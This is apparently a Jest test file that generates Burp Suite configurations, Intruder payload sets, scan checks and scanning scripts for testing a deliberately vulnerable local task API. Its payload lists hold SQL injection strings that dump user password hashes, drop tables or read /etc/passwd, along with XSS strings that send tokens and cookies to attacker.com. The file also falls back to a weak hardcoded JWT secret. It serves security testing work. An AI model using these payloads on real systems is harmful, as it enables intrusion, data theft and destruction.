import request from 'supertest';
import { app } from '../../src/server';
import { setupTestDatabase, testUsers } from '../setup';
import jwt from 'jsonwebtoken';
import * as fs from 'fs';
import * as path from 'path';

describe('Burp Suite Integration Tests', () => {
  let user1Token: string;
  let user2Token: string;
  let user1Id: number;
  let user2Id: number;
  let baseUrl: string;

  beforeAll(async () => {
    const users = await setupTestDatabase();
    user1Id = users.user1.id;
    user2Id = users.user2.id;

    user1Token = jwt.sign(
      { userId: user1Id, email: testUsers.user1.email },
      process.env.JWT_SECRET || 'weak-secret-key',
      { expiresIn: '1h' }
    );

    user2Token = jwt.sign(
      { userId: user2Id, email: testUsers.user2.email },
      process.env.JWT_SECRET || 'weak-secret-key',
      { expiresIn: '1h' }
    );

    baseUrl = process.env.TEST_BASE_URL || 'http://localhost:3000';
  });

  describe('Burp Suite Project Configuration', () => {
    test('should generate Burp Suite project configuration', async () => {
      const burpConfig = {
        project_options: {
          connections: {
            platform_authentication: {
              do_platform_authentication: true,
              credentials: [
                {
                  type: "bearer_token",
                  token: user1Token,
                  domain: "localhost"
                }
              ]
            },
            upstream_proxy: {
              servers: []
            }
          },
          http: {
            redirections: {
              understand_any_status_code: true,
              maximum_redirections: 10
            },
            streaming_responses: {
              store_full_responses: true,
              strip_chunked_encoding: true
            }
          },
          ssl: {
            negotiate_ssl_connections: "per_host",
            client_certificates: {
              certificates: []
            }
          }
        },
        target: {
          scope: {
            advanced_mode: true,
            include: [
              {
                enabled: true,
                file: "^/api/.*",
                host: "^localhost$",
                port: "^3000$",
                protocol: "http"
              }
            ],
            exclude: [
              {
                enabled: true,
                file: "^/static/.*",
                host: "^localhost$",
                port: "^3000$",
                protocol: "http"
              }
            ]
          }
        },
        scanner: {
          live_scanning: {
            live_audit: {
              audit_mode: "thorough"
            },
            live_passive_crawl: {
              crawl_mode: "thorough"
            }
          },
          audit_optimization: {
            scan_speed: "thorough",
            scan_accuracy: "minimize_false_negatives"
          },
          issues_reported: {
            scan_type_intrusive_active: true,
            scan_type_light_active: true,
            scan_type_medium_active: true,
            scan_type_passive: true
          }
        }
      };

      const configPath = path.join(__dirname, '../reports/burp-config.json');
      fs.mkdirSync(path.dirname(configPath), { recursive: true });
      fs.writeFileSync(configPath, JSON.stringify(burpConfig, null, 2));

      expect(fs.existsSync(configPath)).toBe(true);
    });

    test('should create Burp Suite session handling rules', async () => {
      const sessionRules = {
        session_handling_rules: [
          {
            rule_description: "JWT Token Authentication",
            enabled: true,
            tools_scope: ["target", "proxy", "spider", "scanner", "intruder", "repeater"],
            url_scope: {
              include_all_urls: false,
              include: [
                {
                  protocol: "http",
                  host: "localhost",
                  port: "3000",
                  file: "/api/.*"
                }
              ]
            },
            actions: [
              {
                action_type: "add_header",
                header_name: "Authorization",
                header_value: `Bearer ${user1Token}`,
                replace_existing: true
              }
            ]
          },
          {
            rule_description: "Content-Type JSON",
            enabled: true,
            tools_scope: ["target", "proxy", "spider", "scanner", "intruder", "repeater"],
            url_scope: {
              include_all_urls: false,
              include: [
                {
                  protocol: "http",
                  host: "localhost",
                  port: "3000",
                  file: "/api/.*"
                }
              ]
            },
            actions: [
              {
                action_type: "add_header",
                header_name: "Content-Type",
                header_value: "application/json",
                replace_existing: false
              }
            ]
          }
        ]
      };

      const rulesPath = path.join(__dirname, '../reports/burp-session-rules.json');
      fs.writeFileSync(rulesPath, JSON.stringify(sessionRules, null, 2));

      expect(fs.existsSync(rulesPath)).toBe(true);
    });
  });

  describe('Burp Suite Intruder Payloads', () => {
    test('should generate SQL injection payloads for Intruder', async () => {
      const sqlPayloads = {
        payload_set_1: {
          name: "SQL Injection - Basic",
          type: "simple_list",
          payloads: [
            "'",
            "''",
            "\\"",
            "\\"\\"",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'x'='x",
            "admin'--",
            "admin'/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3,4,5,6--",
            "' AND 1=1--",
            "' AND 1=2--",
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('hacker','password')--"
          ]
        },
        payload_set_2: {
          name: "SQL Injection - Union Based",
          type: "simple_list",
          payloads: [
            "' UNION SELECT id,email,password_hash,first_name,last_name,created_at FROM users--",
            "' UNION SELECT table_name,column_name,data_type,'1','2','3' FROM information_schema.columns--",
            "' UNION SELECT id,title,description,priority,status,user_id FROM tasks--",
            "' UNION SELECT 1,version(),user(),database(),@@version,6--",
            "' UNION SELECT 1,2,3,4,5,load_file('/etc/passwd')--"
          ]
        },
        payload_set_3: {
          name: "SQL Injection - Boolean Based",
          type: "simple_list",
          payloads: [
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND (SELECT SUBSTRING(email,1,1) FROM users LIMIT 1) = 'a'--",
            "' AND (SELECT LENGTH(password_hash) FROM users LIMIT 1) > 50--",
            "' AND EXISTS(SELECT * FROM users WHERE email='admin@test.com')--",
            "' AND (SELECT COUNT(*) FROM tasks) > 5--"
          ]
        },
        payload_set_4: {
          name: "SQL Injection - Time Based",
          type: "simple_list",
          payloads: [
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            "' AND (SELECT COUNT(*) FROM pg_sleep(5)) > 0--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            "' UNION SELECT SLEEP(5),2,3,4,5,6--"
          ]
        }
      };

      const payloadsPath = path.join(__dirname, '../reports/burp-sql-payloads.json');
      fs.writeFileSync(payloadsPath, JSON.stringify(sqlPayloads, null, 2));

      expect(fs.existsSync(payloadsPath)).toBe(true);
    });

    test('should generate XSS payloads for Intruder', async () => {
      const xssPayloads = {
        payload_set_1: {
          name: "XSS - Basic Payloads",
          type: "simple_list",
          payloads: [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click me</div>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>"
          ]
        },
        payload_set_2: {
          name: "XSS - Advanced Payloads",
          type: "simple_list",
          payloads: [
            "<script>document.body.innerHTML='Hacked'</script>",
            "<script>fetch('/api/steal',{method:'POST',body:localStorage.token})</script>",
            "<script>new Image().src='http://attacker.com/steal?token='+localStorage.getItem('token')</script>",
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>setTimeout('alert(\"XSS\")',1000)</script>"
          ]
        },
        payload_set_3: {
          name: "XSS - Filter Bypass",
          type: "simple_list",
          payloads: [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script src=data:text/javascript,alert('XSS')></script>",
            "javascript:alert('XSS')",
            "<svg><script>alert('XSS')</script></svg>",
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
            "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">"
          ]
        },
        payload_set_4: {
          name: "XSS - Encoded Payloads",
          type: "simple_list",
          payloads: [
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E"
          ]
        }
      };

      const xssPayloadsPath = path.join(__dirname, '../reports/burp-xss-payloads.json');
      fs.writeFileSync(xssPayloadsPath, JSON.stringify(xssPayloads, null, 2));

      expect(fs.existsSync(xssPayloadsPath)).toBe(true);
    });

    test('should generate IDOR payloads for Intruder', async () => {
      const idorPayloads = {
        payload_set_1: {
          name: "IDOR - Numeric IDs",
          type: "numbers",
          from: 1,
          to: 100,
          step: 1
        },
        payload_set_2: {
          name: "IDOR - User IDs",
          type: "simple_list",
          payloads: [
            "1", "2", "3", "4", "5", "10", "100", "999", "1000",
            "-1", "-2", "0", "null", "undefined", "admin", "root"
          ]
        },
        payload_set_3: {
          name: "IDOR - UUID Patterns",
          type: "simple_list",
          payloads: [
            "00000000-0000-0000-0000-000000000001",
            "11111111-1111-1111-1111-111111111111",
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
            "ffffffff-ffff-ffff-ffff-ffffffffffff"
          ]
        }
      };

      const idorPayloadsPath = path.join(__dirname, '../reports/burp-idor-payloads.json');
      fs.writeFileSync(idorPayloadsPath, JSON.stringify(idorPayloads, null, 2));

      expect(fs.existsSync(idorPayloadsPath)).toBe(true);
    });
  });

  describe('Burp Suite Scanner Configuration', () => {
    test('should create custom scan checks configuration', async () => {
      const scanChecks = {
        passive_checks: [
          {
            name: "JWT Token in Response",
            enabled: true,
            grep_strings: ["\"token\":", "jwt", "bearer"],
            severity: "high",
            confidence: "certain"
          },
          {
            name: "Database Error Messages",
            enabled: true,
            grep_strings: ["postgresql", "syntax error", "relation does not exist"],
            severity: "high",
            confidence: "certain"
          },
          {
            name: "Sensitive Information Disclosure",
            enabled: true,
            grep_strings: ["password_hash", "email", "admin", "secret"],
            severity: "medium",
            confidence: "firm"
          }
        ],
        active_checks: [
          {
            name: "SQL Injection",
            enabled: true,
            payloads: ["'", "' OR '1'='1", "' UNION SELECT NULL--"],
            insertion_points: ["url_path_filename", "url_path_folder", "entire_body", "param_name", "param_value"],
            severity: "high"
          },
          {
            name: "Cross-Site Scripting",
            enabled: true,
            payloads: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            insertion_points: ["param_value", "entire_body"],
            severity: "high"
          },
          {
            name: "IDOR Testing",
            enabled: true,
            payloads: ["1", "2", "999", "../1", "../../2"],
            insertion_points: ["url_path_filename", "param_value"],
            severity: "medium"
          }
        ]
      };

      const checksPath = path.join(__dirname, '../reports/burp-scan-checks.json');
      fs.writeFileSync(checksPath, JSON.stringify(scanChecks, null, 2));

      expect(fs.existsSync(checksPath)).toBe(true);
    });

    test('should create Burp Suite extension configuration', async () => {
      const extensionConfig = {
        extensions: [
          {
            name: "Logger++",
            enabled: true,
            configuration: {
              log_requests: true,
              log_responses: true,
              auto_save: true,
              save_location: "./reports/burp-logs/"
            }
          },
          {
            name: "Autorize",
            enabled: true,
            configuration: {
              low_privilege_user: {
                headers: {
                  "Authorization": `Bearer ${user2Token}`
                }
              },
              high_privilege_user: {
                headers: {
                  "Authorization": `Bearer ${user1Token}`
                }
              }
            }
          },
          {
            name: "JSON Beautifier",
            enabled: true,
            configuration: {
              auto_format: true,
              syntax_highlighting: true
            }
          },
          {
            name: "SQLiPy",
            enabled: true,
            configuration: {
              payloads_file: "./reports/burp-sql-payloads.json",
              time_delay: 5,
              threads: 10
            }
          }
        ]
      };

      const extensionsPath = path.join(__dirname, '../reports/burp-extensions.json');
      fs.writeFileSync(extensionsPath, JSON.stringify(extensionConfig, null, 2));

      expect(fs.existsSync(extensionsPath)).toBe(true);
    });
  });

  describe('Burp Suite Automation Scripts', () => {
    test('should create Burp Suite CLI automation script', async () => {
      const automationScript = `#!/bin/bash

# Burp Suite Professional Automation Script
# This script automates vulnerability scanning using Burp Suite CLI

set -e

# Configuration
BURP_JAR="/opt/BurpSuitePro/burpsuite_pro.jar"
TARGET_URL="${baseUrl}"
PROJECT_FILE="./reports/burp-project.burp"
CONFIG_FILE="./reports/burp-config.json"
REPORT_DIR="./reports/burp-reports"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
NC='\\033[0m'

echo -e "\${GREEN}Starting Burp Suite Automation\${NC}"
echo "Target: \$TARGET_URL"
echo "Project: \$PROJECT_FILE"
echo "Reports: \$REPORT_DIR"

# Create directories
mkdir -p "\$REPORT_DIR"
mkdir -p "./reports/burp-logs"

# Function to run Burp Suite with different scan types
run_burp_scan() {
    local scan_type="\$1"
    local output_file="\$2"
    local additional_args="\$3"
    
    echo -e "\${YELLOW}Running \$scan_type scan...\${NC}"
    
    java -jar "\$BURP_JAR" \\
        --project-file="\$PROJECT_FILE" \\
        --config-file="\$CONFIG_FILE" \\
        --user-config-file="./reports/burp-user-config.json" \\
        --unpause-spider-and-scanner \\
        --target="\$TARGET_URL" \\
        \$additional_args \\
        --report-output="\$output_file" \\
        --report-type=HTML \\
        --report-include-proxy-http-history \\
        --report-include-scanner-issues \\
        --report-include-target-site-map
    
    if [ \$? -eq 0 ]; then
        echo -e "\${GREEN}✓ \$scan_type scan completed\${NC}"
    else
        echo -e "\${RED}✗ \$scan_type scan failed\${NC}"
    fi
}

# 1. Passive Scan
run_burp_scan "Passive" "\$REPORT_DIR/passive-scan-\$TIMESTAMP.html" \\
    "--scanner-passive-scan-only"

# 2. Active Scan - Light
run_burp_scan "Active Light" "\$REPORT_DIR/active-light-\$TIMESTAMP.html" \\
    "--scanner-crawl-and-audit --scanner-audit-level=light"

# 3. Active Scan - Thorough
run_burp_scan "Active Thorough" "\$REPORT_DIR/active-thorough-\$TIMESTAMP.html" \\
    "--scanner-crawl-and-audit --scanner-audit-level=thorough"

# 4. Custom Extension Scans
echo -e "\${YELLOW}Running custom extension scans...\${NC}"

# Autorize scan for IDOR testing
java -jar "\$BURP_JAR" \\
    --project-file="\$PROJECT_FILE" \\
    --config-file="\$CONFIG_FILE" \\
    --target="\$TARGET_URL" \\
    --extension-jar="./extensions/autorize.jar" \\
    --report-output="\$REPORT_DIR/autorize-\$TIMESTAMP.html"

# Generate summary report
echo -e "\${YELLOW}Generating summary report...\${NC}"

cat > "\$REPORT_DIR/summary-\$TIMESTAMP.txt" << EOF
Burp Suite Automation Summary
============================

Target: \$TARGET_URL
Timestamp: \$TIMESTAMP
Scan Duration: \$(date)

Generated Reports:
EOF

ls -la "\$REPORT_DIR"/*\$TIMESTAMP* >> "\$REPORT_DIR/summary-\$TIMESTAMP.txt"

echo -e "\${GREEN}Burp Suite automation completed!\${NC}"
echo "Reports saved to: \$REPORT_DIR"
echo "Summary: \$REPORT_DIR/summary-\$TIMESTAMP.txt"
`;

      const scriptPath = path.join(__dirname, '../scripts/burp-automation.sh');
      fs.mkdirSync(path.dirname(scriptPath), { recursive: true });
      fs.writeFileSync(scriptPath, automationScript);
      fs.chmodSync(scriptPath, '755');

      expect(fs.existsSync(scriptPath)).toBe(true);
    });

    test('should create Burp Suite Python API script', async () => {
      const pythonScript = `#!/usr/bin/env python3

import requests
import json
import time
import sys
from urllib.parse import urljoin

class BurpSuiteAPI:
    def __init__(self, burp_url='http://localhost:1337', api_key=''):
        self.burp_url = burp_url
        self.api_key = api_key
        self.session = requests.Session()
        if api_key:
            self.session.headers.update({'X-API-Key': api_key})

    def get_scanner_status(self):
        """Get current scanner status"""
        try:
            response = self.session.get(f"{self.burp_url}/burp/scanner/status")
            return response.json()
        except Exception as e:
            print(f"Error getting scanner status: {e}")
            return None

    def add_scan_target(self, target_url):
        """Add target to scan scope"""
        data = {
            'urls': [target_url]
        }
        try:
            response = self.session.post(f"{self.burp_url}/burp/target/scope", json=data)
            return response.json()
        except Exception as e:
            print(f"Error adding scan target: {e}")
            return None

    def start_active_scan(self, target_url):
        """Start active scan on target"""
        data = {
            'urls': [target_url],
            'application_logins': [
                {
                    'username': '${testUsers.user1.email}',
                    'password': '${testUsers.user1.password}',
                    'label': 'User1'
                },
                {
                    'username': '${testUsers.user2.email}',
                    'password': '${testUsers.user2.password}',
                    'label': 'User2'
                }
            ]
        }
        try:
            response = self.session.post(f"{self.burp_url}/burp/scanner/scans/active", json=data)
            return response.json()
        except Exception as e:
            print(f"Error starting active scan: {e}")
            return None

    def get_scan_issues(self, scan_id=None):
        """Get scan issues"""
        url = f"{self.burp_url}/burp/scanner/issues"
        if scan_id:
            url += f"?scan_id={scan_id}"
        
        try:
            response = self.session.get(url)
            return response.json()
        except Exception as e:
            print(f"Error getting scan issues: {e}")
            return None

    def generate_report(self, report_type='HTML', include_false_positives=False):
        """Generate scan report"""
        data = {
            'report_type': report_type,
            'include_false_positives': include_false_positives,
            'issue_types': [
                'SQL injection',
                'Cross-site scripting (reflected)',
                'Cross-site scripting (stored)',
                'OS command injection',
                'Path traversal',
                'File path manipulation',
                'LDAP injection',
                'NoSQL injection',
                'Code injection',
                'Server-side request forgery (SSRF)',
                'XML external entity (XXE) injection'
            ]
        }
        
        try:
            response = self.session.post(f"{self.burp_url}/burp/report", json=data)
            return response.content
        except Exception as e:
            print(f"Error generating report: {e}")
            return None

    def run_comprehensive_scan(self, target_url):
        """Run comprehensive vulnerability scan"""
        print(f"Starting comprehensive scan of {target_url}")
        
        # Add target to scope
        print("Adding target to scope...")
        scope_result = self.add_scan_target(target_url)
        if not scope_result:
            print("Failed to add target to scope")
            return False
        
        # Start active scan
        print("Starting active scan...")
        scan_result = self.start_active_scan(target_url)
        if not scan_result:
            print("Failed to start active scan")
            return False
        
        scan_id = scan_result.get('scan_id')
        print(f"Active scan started with ID: {scan_id}")
        
        # Monitor scan progress
        while True:
            status = self.get_scanner_status()
            if status and status.get('scan_percentage') == 100:
                print("Scan completed!")
                break
            elif status:
                print(f"Scan progress: {status.get('scan_percentage', 0)}%")
            
            time.sleep(30)  # Check every 30 seconds
        
        # Get scan results
        print("Retrieving scan issues...")
        issues = self.get_scan_issues(scan_id)
        
        if issues:
            print(f"Found {len(issues)} issues:")
            for issue in issues:
                print(f"  - {issue.get('issue_name')} ({issue.get('severity')})")
        
        # Generate report
        print("Generating HTML report...")
        report = self.generate_report('HTML')
        
        if report:
            report_path = f"./reports/burp-api-report-{int(time.time())}.html"
            with open(report_path, 'wb') as f:
                f.write(report)
            print(f"Report saved to: {report_path}")
        
        return True

    def test_specific_vulnerabilities(self, target_url):
        """Test for specific vulnerability types"""
        vulnerabilities = {
            'sql_injection': {
                'endpoints': [
                    f"{target_url}/api/tasks/search?query=test'",
                    f"{target_url}/api/comments/task/1"
                ],
                'payloads': ["'", "' OR '1'='1", "' UNION SELECT NULL--"]
            },
            'xss': {
                'endpoints': [
                    f"{target_url}/api/comments/task/1"
                ],
                'payloads': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
            },
            'idor': {
                'endpoints': [
                    f"{target_url}/api/tasks/1",
                    f"{target_url}/api/tasks/2",
                    f"{target_url}/api/tasks/999"
                ],
                'payloads': ["1", "2", "999", "../1"]
            }
        }
        
        results = {}
        
        for vuln_type, config in vulnerabilities.items():
            print(f"Testing {vuln_type.upper()}...")
            results[vuln_type] = []
            
            for endpoint in config['endpoints']:
                for payload in config['payloads']:
                    # This would integrate with Burp's Intruder functionality
                    # For now, we'll just log the test
                    test_result = {
                        'endpoint': endpoint,
                        'payload': payload,
                        'timestamp': time.time()
                    }
                    results[vuln_type].append(test_result)
        
        return results

if __name__ == '__main__':
    target_url = sys.argv[1] if len(sys.argv) > 1 else '${baseUrl}'
    
    burp = BurpSuiteAPI()
    
    # Test connection
    status = burp.get_scanner_status()
    if not status:
        print("Error: Cannot connect to Burp Suite API")
        print("Make sure Burp Suite Professional is running with REST API enabled")
        sys.exit(1)
    
    print("Connected to Burp Suite API")
    
    # Run comprehensive scan
    success = burp.run_comprehensive_scan(target_url)
    
    if success:
        print("Comprehensive scan completed successfully")
    else:
        print("Scan failed")
        sys.exit(1)
    
    # Test specific vulnerabilities
    print("Testing specific vulnerabilities...")
    vuln_results = burp.test_specific_vulnerabilities(target_url)
    
    # Save results
    with open('./reports/burp-api-results.json', 'w') as f:
        json.dump(vuln_results, f, indent=2)
    
    print("Vulnerability testing completed")
    print("Results saved to: ./reports/burp-api-results.json")
`;

      const pythonScriptPath = path.join(__dirname, '../scripts/burp-api.py');
      fs.writeFileSync(pythonScriptPath, pythonScript);
      fs.chmodSync(pythonScriptPath, '755');

      expect(fs.existsSync(pythonScriptPath)).toBe(true);
    });
  });

  describe('Burp Suite Test Validation', () => {
    test('should validate endpoints are accessible for Burp testing', async () => {
      const testEndpoints = [
        { path: '/api/auth/login', method: 'POST' },
        { path: '/api/tasks', method: 'GET' },
        { path: '/api/tasks/search', method: 'GET' },
        { path: '/api/tasks/1', method: 'GET' },
        { path: '/api/comments/task/1', method: 'GET' },
        { path: '/api/users/avatar', method: 'POST' },
        { path: '/api/tasks/import', method: 'POST' }
      ];

      const results = [];

      for (const endpoint of testEndpoints) {
        let response;
        
        if (endpoint.method === 'GET') {
          response = await request(app)
            .get(endpoint.path)
            .set('Authorization', `Bearer ${user1Token}`);
        } else {
          response = await request(app)
            .post(endpoint.path)
            .set('Authorization', `Bearer ${user1Token}`)
            .send({});
        }

        results.push({
          endpoint: endpoint.path,
          method: endpoint.method,
          status: response.status,
          accessible: [200, 400, 401, 404, 422, 500].includes(response.status)
        });
      }

      // All endpoints should be accessible (even if they return errors)
      const accessibleEndpoints = results.filter(r => r.accessible);
      expect(accessibleEndpoints.length).toBe(testEndpoints.length);

      // Save endpoint validation results
      const validationPath = path.join(__dirname, '../reports/burp-endpoint-validation.json');
      fs.mkdirSync(path.dirname(validationPath), { recursive: true });
      fs.writeFileSync(validationPath, JSON.stringify(results, null, 2));
    });

    test('should create Burp Suite testing checklist', async () => {
      const testingChecklist = {
        preRequisites: {
          burpSuiteInstalled: true,
          targetAccessible: true,
          authenticationConfigured: true,
          scopeConfigured: true,
          extensionsLoaded: [
            'Logger++',
            'Autorize',
            'JSON Beautifier',
            'SQLiPy'
          ]
        },
        
        manualTestingSteps: [
          {
            step: 1,
            description: "Configure target scope",
            action: "Add target URL to Burp scope",
            expectedResult: "Target appears in scope"
          },
          {
            step: 2,
            description: "Configure authentication",
            action: "Set up session handling rules for JWT token",
            expectedResult: "Requests include Authorization header"
          },
          {
            step: 3,
            description: "Spider the application",
            action: "Run spider scan to discover endpoints",
            expectedResult: "All API endpoints discovered"
          },
          {
            step: 4,
            description: "Passive scan",
            action: "Enable passive scanning",
            expectedResult: "Issues identified in proxy history"
          },
          {
            step: 5,
            description: "Active scan",
            action: "Run active scanner on all endpoints",
            expectedResult: "Vulnerabilities detected and reported"
          },
          {
            step: 6,
            description: "Manual testing with Repeater",
            action: "Test specific payloads in Repeater",
            expectedResult: "Confirm vulnerability exploitation"
          },
          {
            step: 7,
            description: "Intruder attacks",
            action: "Run payload-based attacks with Intruder",
            expectedResult: "Successful exploitation attempts"
          },
          {
            step: 8,
            description: "Generate report",
            action: "Export scan results and findings",
            expectedResult: "Comprehensive vulnerability report"
          }
        ],
        
        expectedFindings: {
          highSeverity: [
            'SQL Injection in search parameter',
            'Stored XSS in comment system',
            'IDOR in task access',
            'SSRF in avatar upload'
          ],
          mediumSeverity: [
            'Missing security headers',
            'Weak JWT implementation',
            'Information disclosure in errors',
            'Session management issues'
          ],
          lowSeverity: [
            'Verbose error messages',
            'Missing input validation',
            'Weak password policy'
          ]
        },
        
        automationScripts: [
          './scripts/burp-automation.sh',
          './scripts/burp-api.py'
        ],
        
        reportLocations: [
          './reports/burp-reports/',
          './reports/burp-api-results.json',
          './reports/burp-endpoint-validation.json'
        ]
      };

      const checklistPath = path.join(__dirname, '../reports/burp-testing-checklist.json');
      fs.writeFileSync(checklistPath, JSON.stringify(testingChecklist, null, 2));

      expect(fs.existsSync(checklistPath)).toBe(true);
    });
  });
});